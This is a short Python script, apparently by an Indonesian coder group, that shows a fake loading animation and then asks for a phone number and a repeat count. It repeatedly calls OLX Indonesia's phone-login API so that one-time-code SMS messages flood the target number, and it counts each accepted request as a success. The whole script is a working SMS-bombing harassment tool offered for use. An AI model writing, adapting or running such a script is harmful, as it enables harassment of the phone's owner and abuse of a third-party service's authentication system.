import itertools
import threading
import time
import sys
 
done = False
 
#animasi loading
def animate():
    for c in itertools.cycle(['A', 'K', 'F', '.']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')
 
t = threading.Thread(target=animate)
t.start()
 
#proses lama disini
 
time.sleep(10)
done = True

import requests, time
print("""
\33[93m\nNIRVANA CODER TEAM 
     -AKF-
""")
print("\nKUSUS NO INDO")



num=input("\nNOPE[ID] ")
jum=int(input("\nJumlah "))


if num[0] == "0":
  num=num[1:]
elif num[0:2] == "62":
  num=num[2:]

print("\n[RESULT]")
for x in range(jum):
  req=requests.post("https://www.olx.co.id/api/auth/authenticate", json={"grantType":"phone","phone":f"+62{num}","language":"id"}).json()
  if req['status'] == 'PENDING':
    print(f"{x+1}. Berhasil {num}")
    
  else:
    print(f"{x+1}. Gagal {num}")
  time.sleep(1.5)